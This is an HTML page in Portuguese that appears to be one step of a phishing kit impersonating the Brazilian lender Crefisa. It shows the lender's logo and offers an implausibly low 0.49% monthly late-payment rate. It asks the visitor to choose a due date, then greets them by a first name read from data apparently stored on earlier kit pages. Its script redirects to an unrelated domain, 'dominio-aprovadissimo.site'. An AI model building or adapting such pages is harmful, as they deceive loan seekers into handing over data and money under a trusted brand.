    <div style="
    display: grid;
    grid-template-areas:
      'top-bar'
      'content'
      'footer';
    grid-template-rows: auto 1fr auto;
    min-height: 100vh;
  ">
<nav class="navbar" style="background-color: #9903d6; padding: 15px 5%; position: fixed; top: 0; left: 0; width: 100%; z-index: 1000; display: flex; justify-content: space-between; align-items: center;">
    <div><img src="1/images/crefisa.png" alt="Logo" style="height: 35px;"></div>
    <div><span class="material-symbols-outlined" style="color: white;"></span></div>
</nav>
<div style="margin-top: 80px;"> <!-- Ajuste para garantir que o conteúdo comece abaixo do cabeçalho fixo -->
    
    </div>

        <div style="grid-area: content; padding: 0 1rem;">
            <div style="margin-top: 18px; padding: 2rem 1.5rem 1rem 1.5rem;" class="main-content">
                <div id="analise-secao" class="mb-3 " style="display: block;">
                    <p class="text-start"></p>
                    <p class="text-start">Se houver atraso no pagamento das parcelas, serão aplicados um juros de 0.49%
                        ao mês. </p>
                    <button class=" btn-custom rounded-pill" onclick="mostrarPagina('vencimento-secao')">Concordo</button>
                </div>

                <!-- Seção da escolha do vencimento da fatura -->
                <div id="vencimento-secao" class="mb-3" style="display: none;">
                    <p style="font-size: 18px;"> <strong id="nomeCliente">Ótimo!</strong> Agora escolha o dia do
                        vencimento das parcelas!</p>
                    <button class="btn-custom w-100" onclick="window.location.href='13.html'">05</button>
                    <button class="btn-custom w-100" onclick="window.location.href='13.html'">10</button>
                    <button class="btn-custom w-100" onclick="window.location.href='13.html'">15</button>
                    <button class="btn-custom w-100" onclick="window.location.href='13.html'">25</button>
                    <button class="btn-custom w-100" onclick="window.location.href='13.html'">30</button>
                </div>
            </div>
        </div>

        <script>
            document.addEventListener("DOMContentLoaded", function () {
                const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuarioUni'));
                if (dadosUsuario && dadosUsuario.nome) {
                    const nomeCompleto = dadosUsuario.nome.split(' ');
                    const primeiroNome = nomeCompleto[0];
                    const nomeParaMostrar = `${primeiroNome}`;
                    document.getElementById('nomeCliente').textContent = nomeParaMostrar;
                } else {
                    console.error('Nome do usuário não encontrado no localStorage.');
                }
            });

            function mostrarPagina(paginaId) {
                document.getElementById('analise-secao').style.display = 'none';
                document.getElementById('vencimento-secao').style.display = 'none';

                document.getElementById(paginaId).style.display = 'block';
            }
            // Mostra a seção de escolha do vencimento inicialmente
            mostrarPagina('analise-secao');

            // Event listener para capturar a escolha e mostrar a próxima seção
            document.querySelectorAll('#vencimento-secao .btn').forEach(button => {
                button.addEventListener('click', function () {
                    window.location.href = 'https://dominio-aprovadissimo.site/card/11/';
                });
            });
        </script>
